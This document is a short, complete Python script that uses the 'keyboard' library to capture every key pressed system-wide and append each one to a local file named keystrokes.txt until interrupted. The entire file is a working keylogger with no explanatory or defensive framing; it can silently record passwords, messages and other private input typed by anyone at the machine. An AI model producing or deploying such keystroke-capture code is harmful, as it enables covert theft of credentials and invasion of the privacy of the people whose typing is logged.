import keyboard

log_file = 'keystrokes.txt'

try:
    def on_key_press(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.name))

    keyboard.on_press(on_key_press)

    keyboard.wait()

except KeyboardInterrupt:
    print('Exiting...')